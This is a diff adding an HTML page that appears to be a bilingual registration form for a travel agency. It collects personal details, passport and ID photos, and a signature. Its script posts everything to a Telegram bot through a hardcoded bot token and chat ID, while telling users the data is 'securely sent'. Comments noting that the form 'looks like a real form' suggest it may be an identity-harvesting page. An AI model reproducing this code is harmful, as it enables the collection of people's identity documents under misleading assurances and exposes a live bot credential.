@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>WILLY TRAVEL AGENCY - Mobile Form</title>
+<style>
+  :root{
+    --accent: #0a7334;     
+    --accent-2: #004aad;   
+    --danger: #e63939;
+    --muted: #616672;
+    --card-bg: #ffffff;
+    --border-light: #e5e7eb;
+    --form-shadow: 0 8px 16px rgba(9,30,66,0.10);
+  }
+  *{box-sizing:border-box}
+  body{
+    font-family: 'Inter', Arial, Helvetica, sans-serif;
+    background: linear-gradient(180deg,#f3f6fb 0%, #eef2f7 100%);
+    margin:0;padding:8px;color:#0f1724;
+  }
+
+  .container.form-main{
+    max-width:410px;
+    margin:22px auto;
+    border:2px solid var(--border-light);
+    border-radius:17px;
+    background:var(--card-bg);
+    box-shadow:var(--form-shadow);
+    padding:0; overflow:hidden;
+  }
+  .form-header {
+    background:linear-gradient(90deg,#e8eefb 0%, #daebf7 100%);
+    padding:22px 14px 11px 14px;
+    display:flex;align-items:center;gap:14px;border-bottom:2px solid var(--border-light);
+  }
+  .company-logo{
+    width:65px;height:65px;object-fit:contain;border-radius:12px;background:#fff;
+    box-shadow:0 5px 16px rgba(0,74,173,0.09);
+    border:1.2px solid #b3c3e7;
+    margin-right:7px;
+  }
+  .header-title{
+    flex:1;
+  }
+  .header-title h1{
+    margin:0;font-size:21px;color:var(--accent-2);
+    font-weight:800;letter-spacing:.7px;
+    font-family: inherit;
+  }
+  .header-title p{
+    margin:5px 0 0;font-size:13.5px;color:var(--muted);font-weight:500
+  }
+  /* photo preview section (looks like a real form) */
+  .photo-form-box{
+    background:#f8fafc;
+    border:2px solid var(--border-light);
+    border-radius:11px;
+    display:flex;flex-direction:row;align-items:center;gap:16px;
+    margin:11px 0 2px 0;
+    padding:13px 13px 13px 11px;
+    box-shadow:0 2px 8px rgba(0,74,173,0.04);
+  }
+  .form-photo-preview{
+    width:86px;height:98px;object-fit:cover;border-radius:8px;
+    border:2.5px solid #cbd5e1;background:#fff;
+    box-shadow:0 2px 10px rgba(0,0,0,0.04);
+    display:block
+  }
+  .fake-rect-label{
+    font-size:12.6px; color:var(--muted); font-weight:600;margin-top:4px;
+  }
+  @media (max-width:410px){
+    .container.form-main{max-width:100vw;}
+    .form-header{padding:13px 6px 7px 6px;}
+    .photo-form-box{padding:9px 7px;}
+    .form-photo-preview{width:62px;height:73px;}
+  }
+  /* rest of form styling */
+  form{display:grid;gap:11px;padding:19px 13px 13px 13px;}
+  label{display:block;font-weight:600;margin-bottom:5px;font-size:13px;color:#18181b}
+  input[type="text"], input[type="number"], input[type="date"], select, textarea{
+    width:100%;padding:9px 10px;border-radius:8px;border:1.5px solid var(--border-light);
+    font-size:14px;background:linear-gradient(180deg,#ffffff,#f7fafc 100%);
+    outline:none;transition:box-shadow .09s, border-color .07s;
+  }
+  input:focus, select:focus, textarea:focus{
+    box-shadow:0 2px 10px rgba(0,74,173,0.06);
+    border-color:var(--accent-2);
+  }
+  .row{display:flex;gap:9px;flex-direction:column}
+  @media(min-width:400px){ .row.two,.row.three{flex-direction:row} .col{flex:1} }
+  .section-title{margin-top:6px;font-weight:700;color:var(--accent);font-size:13px}
+  .small{font-size:12px;color:var(--muted);margin-top:3px}
+  .img-preview{width:96px;height:64px;object-fit:cover;border-radius:8px;border:1.5px solid #dbeafe;margin-top:7px;background:#fff;box-shadow:0 2px 8px rgba(0,74,173,0.03);}
+  
+  /* signature pad */
+  #signaturePad{
+    width:100%;height:90px;max-height:120px;background:#fff;
+    border-radius:10px;border:2px dashed #004aad40;
+    touch-action: none; display:block; margin-bottom:6px;
+    box-shadow:0 2px 14px rgba(10,115,52,0.07);
+    transition:box-shadow .18s, border-color .15s;
+  }
+  .signature-active {
+    border-color: #9340fd;
+    box-shadow: 0 0 0 5px #9340fd33;
+  }
+  .signature-info{
+    font-size:12px;color:var(--muted);text-align:center;margin-bottom:3px;margin-top:-5px;
+    font-weight:500
+  }
+  .controls{display:flex;gap:12px;margin-top:4px}
+  button{
+    cursor:pointer;padding:8px 12px;border-radius:8px;border:none;font-weight:700;
+    background:var(--accent);color:#fff;font-size:14.5px;box-shadow:0 3px 12px rgba(10,115,52,0.07);
+    letter-spacing:.2px;
+  }
+  .btn-ghost{background:transparent;color:var(--accent-2);border:1px solid rgba(0,74,173,0.08);box-shadow:none;}
+  .btn-danger{background:var(--danger);box-shadow:none;}
+  .submit-row{display:flex;gap:9px;align-items:center;justify-content:space-between;margin-top:8px;padding-bottom:5px;}
+  .note{color:var(--muted);font-size:12px;}
+
+  /* popup and loading overlay */
+  #popupOverlay{
+    position:fixed;inset:0;background:rgba(2,6,23,0.48);
+    display:none;align-items:center;justify-content:center;z-index:9999;padding:14px;
+  }
+  #popupBox{width:100%;max-width:320px;background:var(--card-bg);padding:17px;border-radius:10px;text-align:center;box-shadow:0 13px 45px rgba(2,6,23,0.18)}
+  .popup-title{font-size:15px;font-weight:700;color:var(--accent-2);}
+  .popup-code{font-size:17px;font-weight:800;color:var(--accent);}
+  #loadingOverlay{
+    position:fixed;inset:0;display:none;align-items:center;justify-content:center;z-index:10000;
+    background:linear-gradient(0deg, rgba(2,6,23,0.43), rgba(2,6,23,0.43));
+  }
+  .loaderCard{background:#fff;padding:16px;border-radius:10px;display:flex;flex-direction:column;align-items:center;gap:10px;min-width:160px}
+  .spinner{
+    width:36px;height:36px;border-radius:50%;border:5px solid #e6eefc;border-top-color:var(--accent-2);
+    animation:spin 1s linear infinite;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .progressText{font-weight:600;color:#0f1724;font-size:14px;}
+</style>
+</head>
+<body>
+
+<div class="container form-main">
+
+  <!-- ====================== -->
+  <!-- LOGOS SECTION         -->
+  <!-- ====================== -->
+  <div style="display: flex; justify-content: center; align-items: center; gap: 18px; margin-top:20px;">
+    <!-- Replace 'logo1-temp.png' and 'logo2-temp.png' with your real image filenames -->
+    <img src="Screenshot_20251205-070300.png" alt="Logo 1" style="width:62px;height:62px;object-fit:contain;border-radius:12px;box-shadow:0 5px 16px rgba(0,74,173,0.09);border:1.2px solid #b3c3e7;background:#fff;">
+    <img src="Screenshot_20251207-023952.png" alt="Logo 2" style="width:62px;height:62px;object-fit:contain;border-radius:12px;box-shadow:0 5px 16px rgba(0,74,173,0.09);border:1.2px solid #b3c3e7;background:#fff;">
+  </div>
+
+  <!-- ======================== -->
+  <!-- PHOTOS UNDER THE LOGOS  -->
+  <!-- ======================== -->
+  <div style="display: flex; justify-content:center; align-items:center; gap:18px; margin:12px 0 25px 0;">
+    <!-- Replace 'photo1-temp.jpg' and 'photo2-temp.jpg' with your real image filenames -->
+    <img src="Willy Ethiowebp (2).jpg" alt="Attractive Photo 1" style="width:75px;height:90px;object-fit:cover;border-radius:8px;border:2px solid #004aad;background:#fff;box-shadow:0 2px 14px rgba(0,74,173,0.08);">
+    <img src="pplicatwebp (1).jpg" alt="Attractive Photo 2" style="width:75px;height:90px;object-fit:cover;border-radius:8px;border:2px solid #004aad;background:#fff;box-shadow:0 2px 14px rgba(0,74,173,0.08);">
+  </div>
+  <!-- ========================= -->
+  <!-- END LOGO & PHOTOS INSERT -->
+  <!-- ========================= -->
+
+  <div class="form-header">
+    <!-- Replace 'your-logo.png' with actual logo image -->
+    <img src="your-logo.png" class="company-logo" alt="Company Logo" id="companyLogo">
+    <div class="header-title">
+      <h1>WILLY TRAVEL AGENCY</h1>
+      <p>Official Registration Form • ፈጣን እና የሚታመን አገልግሎት</p>
+    </div>
+  </div>
+  <!-- Photo section (real form-like with label, border, preview) -->
+  <div class="photo-form-box">
+      <div>
+        <img id="photoPreview" class="form-photo-preview" style="display:none">
+        <div class="fake-rect-label">Passport/ID Photo</div>
+        <input type="file" accept="image/*" id="photoInput" style="margin-top:7px;width:97px;">
+      </div>
+      <div style="flex:1;">
+        <label style="font-size:12px;font-weight:500;color:var(--muted);margin-bottom:7px;">ቀን / Date</label>
+        <input type="date" id="dateInput" style="width:100%;padding:6px 9px;font-size:13px;border-radius:7px;">
+      </div>
+  </div>
+  <form id="mainForm" autocomplete="off">
+    <div class="section-title">Identity of Registrant / የተመዘገበው መረጃ</div>
+    <label>ሙሉ ስም / FULL NAME</label>
+    <input id="fullName" type="text" placeholder="ሙሉ ስም">
+    <div class="row two">
+      <div>
+        <label>ፆታ / SEX</label>
+        <select id="sex"><option>Male</option><option>Female</option></select>
+      </div>
+      <div>
+        <label>እድሜ / AGE</label>
+        <input id="age" type="number" min="0" placeholder="Age">
+      </div>
+    </div>
+    <label>ስልክ ቁጥር / PHONE</label>
+    <input id="phone" type="text" placeholder="+251 9...">
+    <label>አድራሻ / ADDRESS</label>
+    <input id="address" type="text">
+    <div class="row two">
+      <div>
+        <label>ቁመት / Height (cm)</label>
+        <input id="height" type="number" placeholder="cm">
+      </div>
+      <div>
+        <label>ክብደት / Weight (kg)</label>
+        <input id="weight" type="number" placeholder="kg">
+      </div>
+    </div>
+    <label>Distinctive mark / የሚለየ ምልክት</label>
+    <input id="distinct" type="text">
+    <div class="row two">
+      <div>
+        <label>ወረዳ / District</label>
+        <input id="district" type="text">
+      </div>
+      <div>
+        <label>ቀበሌ / Kebele</label>
+        <input id="kebele" type="text">
+      </div>
+    </div>
+    <div class="row two">
+      <div>
+        <label>የትውልድ ቀን / Birth Date (BOD)</label>
+        <input id="bod" type="date">
+      </div>
+      <div>
+        <label>የትውልድ ቦታ / Birth Place (BOP)</label>
+        <input id="bop" type="text">
+      </div>
+    </div>
+    <div class="section-title">Holder / የተያያዥ ሰው</div>
+    <label>ስም / NAME</label>
+    <input id="holderName" type="text">
+    <label>ስልክ / PHONE</label>
+    <input id="holderPhone" type="text">
+    <div class="section-title">Service / አገልግሎት</div>
+    <label>Choose service / እባክዎ አገልግሎት ይምረጡ</label>
+   
+    <div class="section-title">Signature / ፊርማ</div>
+    <div class="signature-info">Sign below with your finger. እባክዎ እጅዎን በየምትሄዱበት ለማስፈረም ይጠቀሙ።</div>
+    <canvas id="signaturePad"></canvas>
+    <div class="controls">
+      <button type="button" id="clearBtn" class="btn-ghost" tabindex="0">Clear</button>
+      <button type="button" id="previewBtn" class="btn-ghost" tabindex="0">Preview</button>
+      <img id="signaturePreview" class="img-preview" style="display:none;">
+    </div>
+
+    <div class="section-title">ID Upload / የመታወቂያ ያስገቡ</div>
+    <label>ID Front / የፊት ገፅ</label>
+    <input type="file" accept="image/*" id="idFrontInput"><img id="idFrontPreview" class="img-preview" style="display:none">
+    <label>ID Back / የኋላ ገፅ</label>
+    <input type="file" accept="image/*" id="idBackInput"><img id="idBackPreview" class="img-preview" style="display:none">
+
+    <div class="submit-row">
+      <div>
+        <div class="note">All data will be securely sent to our secure channel.<br>ሁሉም መረጃ ወደ ታማኝ ቻናል ይላካል</div>
+      </div>
+      <div style="display:flex;gap:7px">
+        <button id="submitBtn" type="button">Submit</button>
+        <button id="resetBtn" type="button" class="btn-ghost">Reset</button>
+      </div>
+    </div>
+  </form>
+</div>
+
+<!-- LOADING OVERLAY -->
+<div id="loadingOverlay">
+  <div class="loaderCard">
+    <div class="spinner" aria-hidden="true"></div>
+    <div class="progressText" id="progressText">Preparing for upload...</div>
+    <div class="small" id="progressDetail" style="color:var(--muted);font-size:12px">Please keep this page open.</div>
+  </div>
+</div>
+
+<!-- POPUP -->
+<div id="popupOverlay">
+  <div id="popupBox">
+    <div class="popup-title">✅ እባክዎ ስራው ተቀባ!</div>
+    <div id="popupMsg" style="margin-top:6px;">Your form was received successfully.</div>
+    <div style="margin-top:10px">Unique Code</div>
+    <div id="uniqueCode" class="popup-code"></div>
+    <div style="margin-top:12px">
+      <button id="closePopup" type="button">OK</button>
+    </div>
+  </div>
+</div>
+
+<script>
+const $ = id => document.getElementById(id);
+
+// Company logo preview fallback (display none if not found)
+$("companyLogo").onerror = function(){ this.style.display="none"; };
+
+// Photo preview logic
+$("photoInput").addEventListener("change",()=>{
+  const f = $("photoInput").files[0];
+  if(!f){ $("photoPreview").style.display="none"; return; }
+  $("photoPreview").src = URL.createObjectURL(f);
+  $("photoPreview").style.display="block";
+});
+function attachPreview(inputId,imgId){
+  $(inputId).addEventListener("change",()=>{
+    const f = $(inputId).files[0];
+    if(!f){ $(imgId).style.display="none"; return; }
+    $(imgId).src = URL.createObjectURL(f);
+    $(imgId).style.display="block";
+  });
+}
+attachPreview("idFrontInput","idFrontPreview");
+attachPreview("idBackInput","idBackPreview");
+
+// SIGNATURE PAD (touch AND mouse)
+let ctx, drawing = false;
+let points = [];
+const canvas = $("signaturePad");
+function fitCanvas(){
+  const dpr = window.devicePixelRatio || 1;
+  let widthpx = canvas.parentElement.offsetWidth;
+  canvas.width = widthpx * dpr;
+  canvas.height = 90 * dpr;
+  canvas.style.width = widthpx + "px";
+  canvas.style.height = "90px";
+  ctx = canvas.getContext("2d");
+  ctx.setTransform(1,0,0,1,0,0);
+  ctx.scale(dpr, dpr);
+  redrawSignature();
+}
+function getPos(e){
+  const rect = canvas.getBoundingClientRect();
+  if(e.touches && e.touches.length){
+    return { x: (e.touches[0].clientX-rect.left), y: (e.touches[0].clientY-rect.top) };
+  }
+  if(e.changedTouches && e.changedTouches.length){
+    return { x: (e.changedTouches[0].clientX-rect.left), y: (e.changedTouches[0].clientY-rect.top) };
+  }
+  return { x: (e.clientX-rect.left), y: (e.clientY-rect.top) };
+}
+function redrawSignature(){
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  ctx.lineWidth = 2.8;
+  ctx.lineCap = "round";
+  ctx.strokeStyle = "#9340fd";
+  if(points.length>1){
+    ctx.beginPath();
+    ctx.moveTo(points[0].x, points[0].y);
+    for(let i=1;i<points.length;i++)
+      ctx.lineTo(points[i].x, points[i].y);
+    ctx.stroke();
+  }
+}
+// Touch/Pointer
+canvas.addEventListener("touchstart", function(e){
+  e.preventDefault();
+  drawing = true;
+  canvas.classList.add("signature-active");
+  points.push(getPos(e));
+});
+canvas.addEventListener("touchmove", function(e){
+  if(!drawing) return;
+  e.preventDefault();
+  points.push(getPos(e));
+  redrawSignature();
+});
+canvas.addEventListener("touchend", function(e){
+  drawing = false;
+  canvas.classList.remove("signature-active");
+  redrawSignature();
+});
+canvas.addEventListener("touchcancel", function(){
+  drawing = false;
+  canvas.classList.remove("signature-active");
+  redrawSignature();
+});
+canvas.addEventListener("mousedown", function(e){
+  drawing = true;
+  canvas.classList.add("signature-active");
+  points.push(getPos(e));
+});
+canvas.addEventListener("mousemove", function(e){
+  if(!drawing) return;
+  points.push(getPos(e));
+  redrawSignature();
+});
+canvas.addEventListener("mouseup", function(e){
+  drawing = false;
+  canvas.classList.remove("signature-active");
+  redrawSignature();
+});
+canvas.addEventListener("mouseleave", function(e){
+  drawing = false;
+  canvas.classList.remove("signature-active");
+  redrawSignature();
+});
+window.addEventListener("resize", fitCanvas);
+window.addEventListener("orientationchange", fitCanvas);
+window.addEventListener("load", fitCanvas);
+
+$("clearBtn").onclick = ()=>{
+  points = [];
+  redrawSignature();
+  $("signaturePreview").style.display="none";
+};
+$("previewBtn").onclick = ()=>{
+  $("signaturePreview").src = canvas.toDataURL('image/png');
+  $("signaturePreview").style.display="block";
+};
+function canvasToBlob(canvasEl){ 
+  return new Promise(resolve => canvasEl.toBlob(resolve, "image/png"));
+}
+
+// Telegram API
+const BOT = "8547531640:AAGBhfzBDJ18t40R4F4z-sO5a50Q6Mj2Fgw";
+const CHAT = "8267646853";
+async function sendText(text){
+  const res = await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({ chat_id: CHAT, text, parse_mode: "HTML" })
+  });
+  return res;
+}
+async function sendPhoto(file, caption=""){
+  const fd = new FormData();
+  fd.append("chat_id", CHAT);
+  fd.append("photo", file);
+  if(caption) fd.append("caption", caption);
+  const res = await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {
+    method: "POST",
+    body: fd
+  });
+  return res;
+}
+
+// UI helpers
+function showLoading(text, detail=""){
+  $("progressText").innerText = text;
+  $("progressDetail").innerText = detail || "Please keep this page open.";
+  $("loadingOverlay").style.display = "flex";
+}
+function hideLoading(){ $("loadingOverlay").style.display = "none"; }
+function showPopup(code){
+  $("uniqueCode").innerText = code;
+  $("popupOverlay").style.display = "flex";
+}
+function hidePopup(){ $("popupOverlay").style.display = "none"; }
+
+// Reset
+$("closePopup").addEventListener("click", ()=>{
+  hidePopup();
+  document.getElementById("mainForm").reset();
+  $("photoInput").value = "";
+  $("photoPreview").style.display="none";
+  $("idFrontInput").value = "";
+  $("idFrontPreview").style.display="none";
+  $("idBackInput").value = "";
+  $("idBackPreview").style.display="none";
+  $("signaturePreview").style.display="none";
+  points = [];
+  redrawSignature();
+});
+$("resetBtn").onclick = ()=>{
+  if(confirm("Reset the form?")) {
+    document.getElementById("mainForm").reset();
+    $("photoInput").value = "";
+    $("photoPreview").style.display="none";
+    $("idFrontInput").value = "";
+    $("idFrontPreview").style.display="none";
+    $("idBackInput").value = "";
+    $("idBackPreview").style.display="none";
+    $("signaturePreview").style.display="none";
+    points = [];
+    redrawSignature();
+  }
+};
+
+// SUBMIT
+$("submitBtn").addEventListener("click", async ()=>{
+  const submitBtn = $("submitBtn");
+  submitBtn.disabled = true;
+  submitBtn.style.opacity = 0.7;
+  const name = $("fullName").value.trim();
+  if(!name){
+    alert("Please enter full name / እባክዎ ሙሉ ስም ያስገቡ");
+    submitBtn.disabled = false;
+    submitBtn.style.opacity = 1;
+    return;
+  }
+  if(points.length < 5){
+    alert("Please sign in the signature box using your finger.");
+    submitBtn.disabled = false;
+    submitBtn.style.opacity = 1;
+    return;
+  }
+  const code = "WTA-" + (Math.floor(Math.random()*900000)+100000);
+  showLoading("Starting upload...", "Preparing data to send to secure channel");
+
+  try{
+    showLoading("Building message...", "Collecting form fields");
+    const lines = [];
+    function safe(v){ return (v||"").toString(); }
+    lines.push("📌 <b>WILLY TRAVEL AGENCY - NEW SUBMISSION</b>");
+    lines.push("———————————————");
+    lines.push("👤 Name: " + safe($("fullName").value));
+    lines.push("⚧ Sex: " + safe($("sex").value));
+    lines.push("🎂 Age: " + safe($("age").value));
+    lines.push("📞 Phone: " + safe($("phone").value));
+    lines.push("🏠 Address: " + safe($("address").value));
+    lines.push("📏 Height: " + safe($("height").value) + " cm");
+    lines.push("⚖️ Weight: " + safe($("weight").value) + " kg");
+    lines.push("⭐ Distinctive Mark: " + safe($("distinct").value));
+    lines.push("🏘 District: " + safe($("district").value));
+    lines.push("🏠 Kebele: " + safe($("kebele").value));
+    lines.push("🎂 BOD: " + safe($("bod").value));
+    lines.push("📍 BOP: " + safe($("bop").value));
+    lines.push("👨‍👩‍👦 Holder Name: " + safe($("holderName").value));
+    lines.push("📞 Holder Phone: " + safe($("holderPhone").value));
+    
+    lines.push("");
+    lines.push("🔐 UNIQUE CODE: <b>" + code + "</b>");
+    const message = lines.join("\n");
+    // send main text
+    showLoading("Sending message...", "Sending details to Telegram");
+    await sendText(message);
+    // send images (photo, id front, id back)
+    const filesToSend = [
+      {input: "photoInput", caption: `Photo — ${name}`},
+      {input: "idFrontInput", caption: `ID Front — ${name}`},
+      {input: "idBackInput", caption: `ID Back — ${name}`}
+    ];
+    for(let i=0;i<filesToSend.length;i++){
+      const fObj = filesToSend[i];
+      const file = $(fObj.input).files[0];
+      if(file){
+        showLoading(`Uploading file ${i+1}/${filesToSend.length}...`, fObj.caption);
+        try{ await sendPhoto(file, fObj.caption); }catch(e){ }
+      }
+    }
+    // signature
+    showLoading("Uploading signature...", "Sending signature image...");
+    const sigBlob = await canvasToBlob(canvas);
+    if(sigBlob){
+      await sendPhoto(sigBlob, `Signature — ${name}`);
+    }
+    hideLoading();
+    showPopup(code);
+  }catch(err){
+    console.error(err);
+    hideLoading();
+    alert("An error occurred while sending. Please try again. / ስህተት ተከስቷል። እባክዎ ደግመው ይሞክሩ።");
+  } finally {
+    submitBtn.disabled = false;
+    submitBtn.style.opacity = 1;
+  }
+});
+</script>
+</body>
+</html>
